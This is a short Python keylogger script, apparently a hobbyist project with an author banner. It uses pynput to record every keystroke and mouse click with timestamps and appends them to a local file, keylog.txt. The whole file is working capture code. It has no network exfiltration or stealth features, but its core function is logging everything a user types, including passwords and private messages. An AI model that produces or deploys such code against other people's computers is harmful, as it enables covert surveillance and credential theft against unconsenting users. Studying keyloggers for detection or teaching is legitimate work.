from pynput import keyboard,mouse
from datetime import datetime
import termcolor,pyfiglet

count = 0

def on_count(key):
    global count
    count += 1
    print(f'[{count}], Key {key}')

def banner():
    print(termcolor.colored(pyfiglet.figlet_format('keylogger', font='slant'), 'red'))
    print(termcolor.colored(' Author : Venu-exe', 'blue'))
    print(termcolor.colored(' Github : https://github.com/Venu-exe', 'blue'))
    print(termcolor.colored('='*50, 'blue'))

banner()

def on_click(x, y, button, pressed):
    if pressed:
        print(f'[*] Mouse Clicked {button} At {x}, {y}')
        with open('keylog.txt','a') as f:
            f.write(f'{datetime.now()}, Mouse Clicked {button} At {x}, {y}\n')
def on_press(key):
    on_count(key)
    try:
        log = key.char
    except AttributeError:

        if key == keyboard.Key.space:
            log = ' '
        elif key == keyboard.Key.enter:
            log = '\n'
        elif key == keyboard.Key.backspace:
            log = '[BACKSPACE]'
        elif key == keyboard.Key.tab:
            log = '[TAB]'
        else:
            log = f'[{key}]'
    print(log)
    with open('keylog.txt','a') as f:
        f.write(log)

def on_release(key):
    if key == keyboard.Key.esc:
        print(f'[+] Total Key Is Entered: {key}')
        print(termcolor.colored('[*] Saved as keylog.txt', 'green'))
        return False
    try:
        if key == keyboard.Key.space:
            print('[+] Pressed Key Is Space !')
        elif key == keyboard.Key.enter:
            print('[+] Pressed Key Is Enter !')
    except:
        pass


with keyboard.Listener(on_press=on_press, on_release=on_release) as k_listener:
    with mouse.Listener(on_click=on_click) as m_listener:
        m_listener.join()
        k_listener.join()
